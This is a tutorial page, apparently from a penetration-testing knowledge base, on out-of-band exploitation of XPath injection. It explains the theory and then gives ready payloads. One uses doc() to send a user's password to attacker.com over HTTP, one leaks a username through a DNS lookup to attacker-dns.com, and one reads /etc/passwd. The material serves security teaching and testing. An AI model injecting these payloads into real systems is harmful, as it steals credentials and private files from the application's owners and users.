---
title: Out of Band Exploitation in XPath Injection
description: Explore out-of-band exploitation techniques in XPath injection for data
  exfiltration via DNS and HTTP.
keywords:
- OOB exploitation
- XPath injection
- data exfiltration
- HTTP callback
- DNS exfiltration
- XML external entity
- doc() function
- file inclusion
---

# Out Of Band Exploitation

## Context

Out Of Band (OOB) exploitation in XPath injection enables attackers to exfiltrate data or interact with external systems using injected XPath queries. This approach is essential when traditional data extraction methods fail due to blind injection constraints or lack of error messages. A sound understanding of XPath query syntax, XML document structure, HTTP, and DNS protocols is assumed, alongside familiarity with standard XPath injection techniques.

## Theory

### Out-of-Band (OOB) Exploitation in XPath Injection

OOB exploitation leverages the ability to trigger external interactions such as DNS queries or HTTP requests using injected XPath payloads. This technique is particularly effective in contexts where direct data extraction is impeded. An attacker can inject an XPath payload that causes the backend system to issue an external request, which is then captured and analyzed for sensitive data leakage. This technique's power lies in its ability to bypass traditional defenses that rely on error messages or direct output to detect vulnerabilities.

### External Document Access via XPath Functions

Certain XPath processors support functions like `doc()`, which can load and parse external XML documents. This capability can be exploited when user inputs are unsafely integrated into XPath expressions. By injecting calls to such functions with references to attacker-controlled resources, attackers can initiate file or network interactions unbeknownst to the application.

### Data Exfiltration Channels

Data exfiltration through OOB channels can occur via DNS queries, HTTP requests, or file reads. With this approach, an attacker encodes sensitive information into a resource identifier, such as a subdomain or URL path, that the system resolves or attempts to fetch externally. This indirect method of data leakage often goes unnoticed by standard monitoring and logging mechanisms.

### Integration with XXE and XML External Calls

XPath injection has parallels with XXE (XML External Entity) vulnerabilities, particularly when XML processors are configured to resolve external entities. This configuration can expose applications to network or file access initiated through XML calls. Applications often mistakenly assume that XML/XPath processors are isolated from making outbound calls, thus inadvertently expanding the attack surface for skilled adversaries.

## Practice

### Exfiltrate Data via `doc()` Function and HTTP Callback

To perform an OOB exploitation using the `doc()` function, set up an HTTP server to capture outbound requests from the target:

1. Start a local HTTP server to receive callbacks:
   
   ```bash
   python3 -m http.server 8080
   ```

2. Inject the following XPath payload into the vulnerable application:
   
   ```sql
   doc('http://attacker.com:8080/?leak='||/users/user[1]/password)
   ```

This payload crafts a malicious XPath query that causes the backend server to make a request to your server, appending the first user password as a URL parameter. Upon successful injection, sensitive data will be sent to your HTTP server via an OOB request.

### DNS-Based OOB Data Exfiltration via XPath Injection

For DNS-based data exfiltration, first configure a DNS server or use a DNS logging service capable of monitoring DNS queries:

1. Monitor DNS requests for unexpected lookups originating from the target host.
2. Inject the following XPath payload:
   
   ```sql
   doc('http://'||/users/user[1]/username||'.attacker-dns.com')
   ```

This payload encodes the username into the subdomain portion of a URL, triggering a DNS query to `attacker-dns.com`. The query will reveal the exfiltrated data as part of the domain name during resolution.

### File Inclusion via `doc()` Function in XPath

To exploit file inclusion vulnerabilities using the `doc()` function:

1. Inject the following XPath payload:

   ```sql
   doc('file:///etc/passwd')
   ```

2. Observe the application's behavior or error messages to determine if there is leakage of file content.

If successful, the application might inadvertently return or leak the contents of sensitive files like `/etc/passwd`, giving an attacker access to potentially critical information stored on the server.

## Tools

- **Burp Suite**
- **Responder**
- **tcpdump**
- **python3**